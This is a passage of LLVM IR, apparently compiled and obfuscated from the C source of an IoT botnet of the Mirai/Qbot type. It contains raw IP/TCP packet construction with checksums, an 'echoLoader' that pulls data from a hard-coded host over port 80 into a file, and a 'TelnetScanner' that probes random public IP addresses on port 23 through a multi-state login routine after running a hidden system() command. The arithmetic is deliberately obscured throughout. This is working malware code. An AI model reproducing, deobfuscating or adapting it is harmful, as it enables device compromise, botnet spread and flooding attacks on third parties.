  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 %24, -1
  %26 = xor i8 15, -1
  %27 = xor i8 -80, -1
  %28 = or i8 %25, %26
  %29 = or i8 -80, %27
  %30 = xor i8 %28, -1
  %31 = and i8 %30, %29
  %32 = and i8 %24, 15
  %33 = xor i8 %31, -1
  %34 = xor i8 64, -1
  %35 = xor i8 50, -1
  %36 = and i8 %33, 50
  %37 = and i8 %31, %35
  %38 = and i8 %34, 50
  %39 = and i8 64, %35
  %40 = or i8 %36, %37
  %41 = or i8 %38, %39
  %42 = xor i8 %40, %41
  %43 = or i8 %33, %34
  %44 = xor i8 %43, -1
  %45 = or i8 50, %35
  %46 = and i8 %44, %45
  %47 = or i8 %42, %46
  %48 = or i8 %31, 64
  store i8 %47, i8* %23, align 4
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 1
  store i8 0, i8* %50, align 1
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 20, -6020781890829210546
  %54 = add i64 %53, %52
  %55 = add i64 %54, -6020781890829210546
  %56 = add i64 20, %52
  %57 = trunc i64 %55 to i16
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 2
  store i16 %57, i16* %59, align 2
  %60 = call i32 @rand_cmwc()
  %61 = trunc i32 %60 to i16
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 3
  store i16 %61, i16* %63, align 4
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 4
  store i16 0, i16* %65, align 2
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 5
  store i8 -1, i8* %67, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 6
  store i8 %68, i8* %70, align 1
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 7
  store i16 0, i16* %72, align 2
  %73 = load i32, i32* %8, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 8
  store i32 %73, i32* %75, align 4
  %76 = load i32, i32* %7, align 4
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 9
  store i32 %76, i32* %78, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0)) #2
  call void @exit(i32 1) #14
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #2
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #13
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #2
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:36:                                     ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca %struct._IO_FILE*, align 8
  %4 = call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 80)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = call i64 @write(i32 %5, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i32 0, i32 0), i64 13)
  %7 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 512, i32 16, i1 false)
  br label %8

; <label>:8:                                      ; preds = %13, %0
  %9 = load i32, i32* %2, align 4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %11 = call i64 @read(i32 %9, i8* %10, i64 511)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %21

; <label>:13:                                     ; preds = %8
  %14 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0))
  store %struct._IO_FILE* %14, %struct._IO_FILE** %3, align 8
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %17 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* %16)
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %19 = call i32 @fclose(%struct._IO_FILE* %18)
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 512, i32 16, i1 false)
  br label %8

; <label>:21:                                     ; preds = %8
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @shutdown(i32 %22, i32 2) #2
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  ret void
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %63

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 0, %57
  %59 = sub i32 0, 1
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %57, 1
  store i32 %61, i32* %2, align 4
  br label %37

; <label>:63:                                     ; preds = %37
  %64 = call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i32 0, i32 0))
  %65 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %65, align 8
  %66 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %66, align 8
  br label %67

; <label>:67:                                     ; preds = %2372, %63
  br label %68

; <label>:68:                                     ; preds = %67
  store i32 0, i32* %2, align 4
  br label %69

; <label>:69:                                     ; preds = %2366, %68
  %70 = load i32, i32* %2, align 4
  %71 = load i32, i32* %1, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %2372

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %2, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 2
  %78 = load i8, i8* %77, align 8
  %79 = zext i8 %78 to i32
  switch i32 %79, label %2365 [
    i32 0, label %80
    i32 1, label %257
    i32 2, label %442
    i32 3, label %755
    i32 4, label %823
    i32 5, label %1187
    i32 6, label %1255
    i32 7, label %1960
    i32 8, label %1988
    i32 9, label %2016
    i32 10, label %2070
    i32 11, label %2081
    i32 12, label %2109
  ]

; <label>:80:                                     ; preds = %73
  %81 = load i32, i32* %2, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 8
  %85 = load i8*, i8** %84, align 8
  call void @llvm.memset.p0i8.i64(i8* %85, i8 0, i64 1024, i32 1, i1 false)
  %86 = load i32, i32* %2, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 3
  %90 = load i8, i8* %89, align 1
  %91 = icmp ne i8 %90, 0
  br i1 %91, label %92, label %112

; <label>:92:                                     ; preds = %80
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 8
  %97 = load i8*, i8** %96, align 8
  store i8* %97, i8** %11, align 8
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %99
  %101 = bitcast %struct.telstate_t* %100 to i8*
  call void @llvm.memset.p0i8.i64(i8* %101, i8 0, i64 32, i32 16, i1 false)
  %102 = load i8*, i8** %11, align 8
  %103 = load i32, i32* %2, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 8
  store i8* %102, i8** %106, align 8
  %107 = call i32 @getRandomPublicIP()
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 1
  store i32 %107, i32* %111, align 4
  br label %156

; <label>:112:                                    ; preds = %80
  %113 = load i32, i32* %2, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %114
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %115, i32 0, i32 5
  %117 = load i8, i8* %116, align 1
  %118 = sub i8 %117, 7
  %119 = add i8 %118, 1
  %120 = add i8 %119, 7
  %121 = add i8 %117, 1
  store i8 %120, i8* %116, align 1
  %122 = load i32, i32* %2, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  %126 = load i8, i8* %125, align 1
  %127 = zext i8 %126 to i64
  %128 = icmp eq i64 %127, 13
  br i1 %128, label %129, label %142

; <label>:129:                                    ; preds = %112
  %130 = load i32, i32* %2, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 5
  store i8 0, i8* %133, align 1
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = sub i8 0, 1
  %140 = sub i8 %138, %139
  %141 = add i8 %138, 1
  store i8 %140, i8* %137, align 2
  br label %142

; <label>:142:                                    ; preds = %129, %112
  %143 = load i32, i32* %2, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %144
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %145, i32 0, i32 4
  %147 = load i8, i8* %146, align 2
  %148 = zext i8 %147 to i64
  %149 = icmp eq i64 %148, 4
  br i1 %149, label %150, label %155

; <label>:150:                                    ; preds = %142
  %151 = load i32, i32* %2, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 3
  store i8 1, i8* %154, align 1
  br label %2366

; <label>:155:                                    ; preds = %142
  br label %156

; <label>:156:                                    ; preds = %155, %92
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %157, align 4
  %158 = call zeroext i16 @htons(i16 zeroext 23) #13
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %158, i16* %159, align 2
  %160 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %161 = getelementptr inbounds [8 x i8], [8 x i8]* %160, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %161, i8 0, i64 8, i32 4, i1 false)
  %162 = load i32, i32* %2, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %168 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %167, i32 0, i32 0
  store i32 %166, i32* %168, align 4
  %169 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 0
  store i32 %169, i32* %173, align 16
  %174 = load i32, i32* %2, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 16
  %179 = bitcast %struct.timeval* %10 to i8*
  %180 = call i32 @setsockopt(i32 %178, i32 1, i32 20, i8* %179, i32 16) #2
  %181 = load i32, i32* %2, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 16
  %186 = bitcast %struct.timeval* %10 to i8*
  %187 = call i32 @setsockopt(i32 %185, i32 1, i32 21, i8* %186, i32 16) #2
  %188 = load i32, i32* %2, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %156
  br label %2366

; <label>:195:                                    ; preds = %156
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = load i32, i32* %2, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = call i32 (i32, i32, ...) @fcntl(i32 %205, i32 3, i8* null)
  %207 = xor i32 %206, -1
  %208 = xor i32 2048, -1
  %209 = xor i32 -2095449887, -1
  %210 = and i32 %207, -2095449887
  %211 = and i32 %206, %209
  %212 = and i32 %208, -2095449887
  %213 = and i32 2048, %209
  %214 = or i32 %210, %211
  %215 = or i32 %212, %213
  %216 = xor i32 %214, %215
  %217 = or i32 %207, %208
  %218 = xor i32 %217, -1
  %219 = or i32 -2095449887, %209
  %220 = and i32 %218, %219
  %221 = or i32 %216, %220
  %222 = or i32 %206, 2048
  %223 = call i32 (i32, i32, ...) @fcntl(i32 %200, i32 4, i32 %221)
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %230 = call i32 @connect(i32 %228, %struct.sockaddr* %229, i32 16)
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %247

; <label>:232:                                    ; preds = %195
  %233 = call i32* @__errno_location() #13
  %234 = load i32, i32* %233, align 4
  %235 = icmp ne i32 %234, 115
  br i1 %235, label %236, label %247

; <label>:236:                                    ; preds = %232
  %237 = load i32, i32* %2, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 0
  %241 = load i32, i32* %240, align 16
  %242 = call i32 @sclose(i32 %241)
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 3
  store i8 1, i8* %246, align 1
  br label %256

; <label>:247:                                    ; preds = %232, %195
  %248 = load i32, i32* %2, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %249
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %250, i32 0, i32 2
  store i8 1, i8* %251, align 8
  %252 = load i32, i32* %2, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 6
  store i32 0, i32* %255, align 4
  br label %256

; <label>:256:                                    ; preds = %247, %236
  br label %2365

; <label>:257:                                    ; preds = %73
  %258 = load i32, i32* %2, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 6
  %262 = load i32, i32* %261, align 4
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %271

; <label>:264:                                    ; preds = %257
  %265 = call i64 @time(i64* null) #2
  %266 = trunc i64 %265 to i32
  %267 = load i32, i32* %2, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 6
  store i32 %266, i32* %270, align 4
  br label %271

; <label>:271:                                    ; preds = %264, %257
  br label %272

; <label>:272:                                    ; preds = %271
  %273 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %274 = getelementptr inbounds [16 x i64], [16 x i64]* %273, i64 0, i64 0
  %275 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %274) #2, !srcloc !5
  %276 = extractvalue { i64, i64* } %275, 0
  %277 = extractvalue { i64, i64* } %275, 1
  %278 = trunc i64 %276 to i32
  store i32 %278, i32* %12, align 4
  %279 = ptrtoint i64* %277 to i64
  %280 = trunc i64 %279 to i32
  store i32 %280, i32* %13, align 4
  br label %281

; <label>:281:                                    ; preds = %272
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %2, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 0
  %287 = load i32, i32* %286, align 16
  %288 = srem i32 %287, 64
  %289 = zext i32 %288 to i64
  %290 = shl i64 1, %289
  %291 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %292 = load i32, i32* %2, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %293
